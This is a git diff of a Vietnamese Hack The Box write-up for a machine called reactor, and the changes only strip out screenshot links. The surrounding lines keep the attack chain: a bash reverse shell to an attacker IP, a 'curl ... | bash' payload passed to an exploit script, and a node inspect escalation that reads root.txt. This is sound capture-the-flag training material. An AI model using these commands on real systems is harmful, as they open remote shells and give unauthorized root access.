@@ -160,8 +160,7 @@ echo 'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1' > ~/reactor_htb/rev.sh
 cd ~/reactor_htb && python3 -m http.server 8000
 ```
 
-![Target tải rev.sh từ HTTP server của attacker](<img width="700" height="388" alt="Screenshot 2026-06-01 132737" src="https://github.com/user-attachments/assets/551cdb67-48f2-43c2-bcc9-a37f3b81432d" />
-)
+
 
 Bật listener và gửi exploit:
 
@@ -173,15 +172,13 @@ nc -lvnp 4444
 python3 attack.py http://10.129.7.128:3000 "curl http://10.10.14.98:8000/rev.sh|bash"
 ```
 
-![Exploit chạy thành công — request timed out vì reverse shell đã kết nối](<img width="710" height="855" alt="Screenshot 2026-06-01 132801" src="https://github.com/user-attachments/assets/83d445cb-1504-4114-9324-af822a065348" />
-)
+
 
 ### 2.5 Shell as `node`
 
 Reverse shell kết nối thành công!
 
-![Reverse shell — whoami: node, listing /opt/reactor-app](<img width="1919" height="864" alt="Screenshot 2026-06-01 132820" src="https://github.com/user-attachments/assets/89230f49-f731-4e71-ab25-489cc7471801" />
-)
+
 
 ```
 node@reactor:/opt/reactor-app$ whoami
@@ -196,8 +193,7 @@ node
 
 Từ reverse shell, duyệt các file trong `/opt/reactor-app`:
 
-![Enum: .env, SQLite database, /etc/passwd, users table](<img width="883" height="842" alt="Screenshot 2026-06-01 132927" src="https://github.com/user-attachments/assets/4b446462-b8c7-46a0-bdbc-c95d6d1bf6ab" />
-)
+
 
 ### 3.2 File .env
 
@@ -289,8 +285,7 @@ Tại prompt `debug>`, thực thi command để đọc root flag:
 exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
 ```
 
-![Privilege Escalation — node inspect kết nối thành công, đọc root.txt](<img width="1919" height="846" alt="Screenshot 2026-06-01 132935" src="https://github.com/user-attachments/assets/14c167a8-2ed2-4ce1-abf5-239dc003fcbc" />
-)
+
 
 🏁 **Root Flag obtained!**
 
